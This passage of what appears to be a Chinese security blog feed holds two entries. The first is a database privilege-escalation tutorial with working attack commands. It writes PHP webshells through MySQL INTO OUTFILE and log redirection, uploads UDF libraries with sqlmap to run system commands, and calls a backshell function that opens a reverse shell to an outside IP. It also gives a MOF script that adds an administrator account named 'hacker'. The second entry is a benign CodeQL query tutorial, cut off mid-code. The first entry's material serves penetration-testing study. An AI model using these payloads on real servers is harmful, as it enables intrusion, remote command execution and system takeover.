href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h5><ul><li>知道网站绝对路径</li><li>高权限数据库用户</li><li>load_file() 开启 即 secure_file_priv 无限制</li><li>网站路径有写入权限</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">Value</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">NULL</td><td align="left">不允许导入或导出</td></tr><tr><td align="left">&#x2F;tmp</td><td align="left">只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td align="left">空</td><td align="left">不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p>如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在sqlmap下，可以这么做</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p><h5 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h5><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>c1595d3a029a.log <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 更改日志文件位置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看当前配置</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> <span class="keyword">ON</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>info.php <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"></span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 此时已经写到 info.php 文件当中了</span><br><span class="line">root<span class="variable">@c1595d3a029a</span>:<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>$ cat info.php </span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>mysqld, Version: <span class="number">5.5</span><span class="number">.61</span><span class="number">-0</span>ubuntu0<span class="number">.14</span><span class="number">.04</span><span class="number">.1</span> ((Ubuntu)). started <span class="keyword">with</span>:</span><br><span class="line">Tcp port: <span class="number">3306</span>  Unix socket: <span class="operator">/</span>var<span class="operator">/</span>run<span class="operator">/</span>mysqld<span class="operator">/</span>mysqld.sock</span><br><span class="line"><span class="type">Time</span>                 Id Command    Argument</span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">14</span>:<span class="number">46</span>       <span class="number">40</span> Query    <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span></span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">34</span>       <span class="number">40</span> Query    <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><h5 id="加载动态链接库"><a href="#加载动态链接库" class="headerlink" title="加载动态链接库"></a>加载动态链接库</h5><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><p>sqlmap下dll文件的位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap根目录<span class="operator">/</span>data<span class="operator">/</span>udf<span class="operator">/</span>mysql</span><br></pre></td></tr></table></figure><p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具cloak.py 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录情况</span></span><br><span class="line">➜ <span class="built_in">pwd</span></span><br><span class="line">/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前目录下的情况</span></span><br><span class="line">➜ <span class="built_in">ls</span></span><br><span class="line">README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so</span><br><span class="line">__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure><h5 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h5><p>接下来的任务是把 UDF 的动态链接库文件放到 MySQL 的插件目录下，这个目录改如何去寻找呢？可以使用如下的 SQL 语句来查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br></pre></td></tr></table></figure><p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">233</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后写入动态链接库</p><p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://localhost:30008/&quot; <span class="comment">--data=&quot;id=1&quot; --file-write=&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot; --file-dest=&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure><h4 id="创建自定义函数调用命令"><a href="#创建自定义函数调用命令" class="headerlink" title="创建自定义函数调用命令"></a>创建自定义函数调用命令</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure><p>这样，就是支持创建这个函数的命令执行了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure><h4 id="tools工具"><a href="#tools工具" class="headerlink" title="tools工具"></a>tools工具</h4><p><a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p><p>一键 DUMP UDF 和函数，操作门槛降低了很多</p><h4 id="mysql-不允许外连"><a href="#mysql-不允许外连" class="headerlink" title="mysql 不允许外连"></a>mysql 不允许外连</h4><p>这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上：</p><p>国光师傅这里顺便打包了一份出来：<a href="https://sqlsec.lanzoux.com/ibpoGijd6bc">蓝奏云：Navicat tunnel.zip</a> 实际上 Navicat 很久很久以前就自带这些脚本了，这个脚本有点类似于 reGeorg，只是官方的脚本用起来更舒服方便一点，脚本的界面如下：</p><p><img src="https://image.3001.net/images/20201119/16057520384495.png" alt="img"></p><p>接着连接的时候设置 HTTP 通道：</p><p><img src="https://image.3001.net/images/20201119/16057523604421.png" alt="img"></p><p>这个时候主机地址填写 localhost 即可：</p><p>连接成功后自然就可以愉快地进行手工 UDF 提权啦</p><h4 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h4><p>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell        <span class="comment"># 执行cmd</span></span><br><span class="line">downloader      <span class="comment"># 下载者,到网上下载指定文件并保存到指定目录</span></span><br><span class="line">open3389        <span class="comment"># 通用开3389终端服务,可指定端口(不改端口无需重启)</span></span><br><span class="line">backshell       <span class="comment"># 反弹Shell</span></span><br><span class="line">ProcessView     <span class="comment"># 枚举系统进程</span></span><br><span class="line">KillProcess     <span class="comment"># 终止指定进程</span></span><br><span class="line">regread         <span class="comment"># 读注册表</span></span><br><span class="line">regwrite        <span class="comment"># 写注册表</span></span><br><span class="line">shut            <span class="comment"># 关机,注销,重启</span></span><br><span class="line">about           <span class="comment"># 说明与帮助函数</span></span><br></pre></td></tr></table></figure><p>国光师傅找的：<a href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">https://sqlsec.lanzoux.com/iEQA0ijfu6d</a></p><p><img src="https://image.3001.net/images/20201119/16057546316568.png" alt="img"></p><p>然后目标机器上导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> backshell <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后反弹shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> backshell(&quot;10.20.24.244&quot;, <span class="number">2333</span>);</span><br></pre></td></tr></table></figure><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功</p><p>提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><p>脚本内容如下：</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma name<span class="built_in">space</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="string">&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>核心<code>payload</code>为：</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="sqlserver-msssql"><a href="#sqlserver-msssql" class="headerlink" title="sqlserver(msssql)"></a>sqlserver(msssql)</h2><p>需要SA权限</p><h3 id="使用xp-cmdshell进行提权"><a href="#使用xp-cmdshell进行提权" class="headerlink" title="使用xp_cmdshell进行提权"></a>使用xp_cmdshell进行提权</h3><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除</p><h3 id="使用sp-oacreate进行提权-无回显"><a href="#使用sp-oacreate进行提权-无回显" class="headerlink" title="使用sp_oacreate进行提权|无回显"></a>使用sp_oacreate进行提权|无回显</h3><h3 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h3><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/database/270106.html">https://www.freebuf.com/articles/database/270106.html</a></p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-26">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-26</a></p><p><a href="https://www.freebuf.com/vuls/276814.html">https://www.freebuf.com/vuls/276814.html</a></p><p><a href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#55-%E5%88%A9%E7%94%A8-mssql-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83">https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#55-%E5%88%A9%E7%94%A8-mssql-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83</a></p>]]></content>
    
    
    <summary type="html">对数据库提权之类的方式做一个学习</summary>
    
    
    
    <category term="渗透测试" scheme="https://h0ld1rs.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="https://h0ld1rs.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>codeql-java测试</title>
    <link href="https://h0ld1rs.github.io/posts/26357.html"/>
    <id>https://h0ld1rs.github.io/posts/26357.html</id>
    <published>2022-03-25T15:48:57.000Z</published>
    <updated>2022-03-26T13:23:39.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="codeql-java测试"><a href="#codeql-java测试" class="headerlink" title="codeql-java测试"></a>codeql-java测试</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li>codeql本质上还是查询语言，语法和sql语句类似</li><li>codeql主要就是利用分析引擎分析代码之间的关系，生成一个代码数据库。然后我们直接写ql就可以进行各种查询，如找某个方法或者某个类，找方法引用，跟踪某个参数的传递等等用法</li><li>codeql里面的谓词就是把各种条件封装成方法，需要个人理清需要查询的条件才能知道自己想要什么</li></ol><h2 id="编译数据库常用的命令"><a href="#编译数据库常用的命令" class="headerlink" title="编译数据库常用的命令"></a>编译数据库常用的命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">跳过测试，构建</span><br><span class="line">--<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml -Dmaven.test.skip=true&quot;</span></span><br><span class="line">无论项目结果如何,构建从不失败</span><br><span class="line">--<span class="built_in">command</span>=<span class="string">&quot;mvn -fn clean install --file pom.xml -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>针对编译型语言来说，要在创建索引数据库的时候增加编译的功能，主要是针对java，对于非编译性的语言来说，直接扫描。go 既可编译，也可以不编译。</p><h2 id="基本查询条件"><a href="#基本查询条件" class="headerlink" title="基本查询条件"></a>基本查询条件</h2><h3 id="过滤-Method"><a href="#过滤-Method" class="headerlink" title="过滤 Method"></a>过滤 Method</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;parseObject&quot;</span>)</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><h3 id="查询这个方法的类名-className"><a href="#查询这个方法的类名-className" class="headerlink" title="查询这个方法的类名(className)"></a>查询这个方法的类名(className)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;parseObject&quot;</span>)</span><br><span class="line">select method,method.getDeclaringType()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="查询Method-name-和-interface-name"><a href="#查询Method-name-和-interface-name" class="headerlink" title="查询Method name 和 interface name"></a>查询Method name 和 interface name</h3><p>比如我想查询<code>ContentTypeHandler</code> 的所有子类<code>toObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;toObject&quot;</span>) and method.getDeclaringType().getASupertype().hasQualifiedName(<span class="string">&quot;org.apache.struts2.rest.handler&quot;</span>, <span class="string">&quot;ContentTypeHandler&quot;</span>)</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><blockquote><p>getDeclaringType()    &#x2F;&#x2F;获取类名</p><p>getDeclaringType().getASupertype()    &#x2F;&#x2F;获取类名继承的接口</p><p>hasQualifiedName   &#x2F;&#x2F; 获取继承类型的包的名字</p></blockquote><h3 id="Call和Callable"><a href="#Call和Callable" class="headerlink" title="Call和Callable"></a>Call和Callable</h3><p>Callable表示可调用的方法或构造器的集合。</p><p>Call表示调用Callable的这个过程（方法调用，构造器调用等等）</p><h2 id="Expr"><a href="#Expr" class="headerlink" title="Expr"></a>Expr</h2><p>Expr —&gt; 参数</p><h3 id="MethodAccess"><a href="#MethodAccess" class="headerlink" title="MethodAccess"></a>MethodAccess</h3><p>用在过滤方法调用上</p><p>一般是先查<code>method</code>，然后与<code>MethodAccess.getMethod()</code> 进行比较。</p><p>比如查<code>ContentTypeHandler</code> 的 <code>toObject()</code> 方法的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from MethodAccess call, Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;toObject&quot;</span>) and method.getDeclaringType().getASupertype().hasQualifiedName(<span class="string">&quot;org.apache.struts2.rest.handler&quot;</span>, <span class="string">&quot;ContentTypeHandler&quot;</span>) and call.getMethod() = method</span><br><span class="line">select call</span><br></pre></td></tr></table></figure><p>这种方式只能查到<code>JsonLibHandler</code> 这样显式定义的</p><h4 id="改进可以使用getAnAncestor-或者getASupertype"><a href="#改进可以使用getAnAncestor-或者getASupertype" class="headerlink" title="改进可以使用getAnAncestor() 或者getASupertype()*"></a>改进可以使用<code>getAnAncestor()</code> 或者<code>getASupertype()*</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span 